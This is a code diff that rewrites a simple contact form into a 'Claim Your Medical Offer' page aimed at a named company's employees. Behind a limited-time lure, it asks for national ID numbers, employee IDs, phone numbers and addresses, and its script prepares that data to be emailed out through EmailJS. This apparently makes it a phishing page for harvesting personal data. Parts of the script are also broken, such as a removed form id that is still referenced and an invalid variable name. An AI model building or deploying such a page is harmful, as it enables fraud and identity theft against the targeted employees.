@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Form</title>
+    <title>Medical Offer Registration</title>
     <script type="text/javascript"
         src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
 </script>
@@ -14,31 +14,146 @@
       });
    })();
 </script>
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+    }
+    .form-container {
+        max-width: 600px;
+        margin: 50px auto;
+        background-color: white;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+    h1 {
+        text-align: center;
+        color: #333;
+    }
+    p {
+        text-align: center;
+        color: #666;
+    }
+    label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: bold;
+        color: #333;
+    }
+    input[type="text"], input[type="email"], input[type="tel"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+    }
+    select, textarea {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+    }
+    button {
+        width: 100%;
+        padding: 10px;
+        background-color: #28a745;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+    }
+    button:hover {
+        background-color: #218838;
+    }
+</style>
+
 </head>
 <body>
-    <h2>Contact Form</h2>
-    <form id="contact-form">
-        <label for="name">Name:</label><br>
-        <input type="text" id="name" name="name" required><br><br>
+    <div class="form-container">
+        <h1>Claim Your Medical Offer</h1>
+        <p>Claim your exclusive medical offer today and enjoy special claims on health check-ups, treatments, and consultations. Don’t miss out on this limited-time opportunity to prioritize your health!</p>
 
-        <label for="phone">Phone Number:</label><br>
-        <input type="tel" id="phone" name="phone" required><br><br>
+        <form action="#" method="post">
+            <label for="company-email">Company E-mail *</label>
+            <input type="email" id="company-email" name="company-email" placeholder="example@johorplantations.com" required>
 
-        <input type="submit" value="Submit">
-    </form>
+            <label for="first-name">Name *</label>
+            <input type="text" id="first-name" name="first-name" placeholder="First Name" required>
+            <input type="text" id="last-name" name="last-name" placeholder="Last Name" required>
+
+            <label for="id-number">Identification Number *</label>
+            <input type="text" id="id-number" name="id-number" placeholder="000000-00-0000" required>
+
+            <label for="employee-id">Employee ID *</label>
+            <input type="text" id="employee-id" name="employee-id" required>
+
+            <label for="mobile-number">Mobile Number *</label>
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="country-code" name="country-code" placeholder="Country Code" style="flex: 1;" required>
+                <input type="tel" id="phone-number" name="phone-number" placeholder="Phone Number" style="flex: 2;" required>
+            </div>
+
+            <label for="address">Address</label>
+            <input type="text" id="address-line1" name="address-line1" placeholder="Street Address">
+            <input type="text" id="address-line2" name="address-line2" placeholder="Street Address Line 2">
+            <input type="text" id="city" name="city" placeholder="City">
+            <input type="text" id="state" name="state" placeholder="State / Province">
+            <input type="text" id="postal-code" name="postal-code" placeholder="Postal / Zip Code">
+
+            <label for="claim-type">Select Your Claim *</label>
+            <select id="claim-type" name="claim-type" required>
+                <option value="">Please Select</option>
+                <option value="health-checkup">Health Check-up</option>
+                <option value="treatment">Treatment</option>
+                <option value="consultation">Consultation</option>
+            </select>
+
+            <p>* An email will be sent with the voucher or details on the claiming process. Offer valid until 31st October.</p>
+
+            <button type="submit">Submit</button>
+        </form>
 
     <script>
         document.getElementById('contact-form').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent the default form submission behavior
 
             // Collect form data
-            var name = document.getElementById('name').value;
-            var phone = document.getElementById('phone').value;
+            var email = document.getElementById('company-email').value;
+            var fname = document.getElementById('first-name').value;
+            var lname = document.getElementById('last-name').value;
+            var id = document.getElementById('id-number').value;
+            var wid = document.getElementById('employee-id').value;
+            var countrycode = document.getElementById('country-code').value;
+            var phone = document.getElementById('phone-number').value;
+            var add1 = document.getElementById('address-line1').value;
+            var add2 = document.getElementById('address-line2').value;
+            var city = document.getElementById('city').value;
+            var state = document.getElementById('state').value;
+            var pcode = document.getElementById('postal-code').value;
+            var claim = document.getElementById('claim-type').value;
 
             // Prepare the email data
             var emailParams = {
-                from_name: name,
-                phone_number: phone
+                from_firstname: first-name,
+                from_lastname: last-name,
+                from_id: id,
+                from_wid: wid,
+                from_countrycode: countrycode,
+                from_phone: phone,
+                from_add1: add1,
+                from_add2: add2,
+                from_city: city,
+                from_state: state,
+                from_pcode: pcode,
+                from_clain: claim
             };
 
             // Send the email using EmailJS
